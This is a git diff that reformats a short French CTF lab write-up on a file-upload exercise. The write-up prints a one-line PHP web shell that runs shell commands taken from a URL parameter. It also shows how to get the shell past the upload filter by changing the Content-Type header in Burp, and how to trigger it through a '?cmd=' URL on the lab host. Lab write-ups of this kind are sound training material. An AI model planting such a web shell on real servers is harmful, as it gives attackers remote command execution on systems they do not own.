@@ -1,14 +1,15 @@
 # Secu
 ## 1 . Upload_medium
 
-* Il faut tout d'abord créer un fichier en `.php` comme par exemple, `payload.php`.
+* A. 
+Il faut tout d'abord créer un fichier en `.php` comme par exemple, `payload.php`.
 Ce dossier devra contenir les lignes suivantes :
 ```
 <?php
 echo shell_exec($_GET['cmd']);
 ?>*
 ```
-* Ensuite, nous avant de l'upload, nous utiliserons une extension de navigateur comme par exemple Foxy proxy et le logiciel Burp afin de pouvoir changer le fichier envoyé.
+Ensuite, avant de l'upload, nous utiliserons une extension de navigateur comme par exemple Foxy proxy et le logiciel Burp afin de pouvoir changer le fichier envoyé.
 Grace a burp, nous devons modifier la ligne :
 `Content-Type: application/octet-stream`
 par :
@@ -16,6 +17,7 @@ par :
 Il faut ensuite appuyer sur forward dans Burp.
 et enfin désactiver notre proxy.
 
+* B.
 On arrive sur la partie délicate, il faut ouvrir le fichier étant apparu sur la page.
 Grace au php, nous avons accès au cmd depuis le lien du site, il suffit de le modifier un peu:
 `http://ctf-labo.cyber-stuff.net/upload_medium/uploads/test.php?cmd=`
